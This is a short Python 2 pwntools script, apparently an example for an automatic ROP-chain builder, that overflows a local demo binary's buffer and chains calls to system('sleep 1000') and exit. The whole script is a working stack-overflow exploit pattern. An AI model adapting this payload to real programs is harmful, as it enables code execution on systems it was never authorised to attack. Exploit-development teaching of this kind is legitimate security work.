import sys, logging
from pwn import *
import ropme, goal

filename = './example/bof_system'
p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40071e\nbreak *system\nbreak *execve\nset follow-fork-mode child\ncatch syscall execve")

print "Using automatically built ROP chain"
files = [(filename, 0)]
sleep_1000_address = 0x400810 # address of the string "sleep 1000"
exit_address = "0x400570" # the exit symbol's address isn't correct when found by pyelftools, so we need to get it ourselves
goal_resolver = goal.create_from_arguments(files, [], [["function", "system", sleep_1000_address], ["function", exit_address]])
rop = ropme.rop(files, goal_resolver, logging.CRITICAL)

payload = 'A'*512 + 'B'*8 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.readline()
p.writeline(payload)
print "\n%s\n" % p.readline()
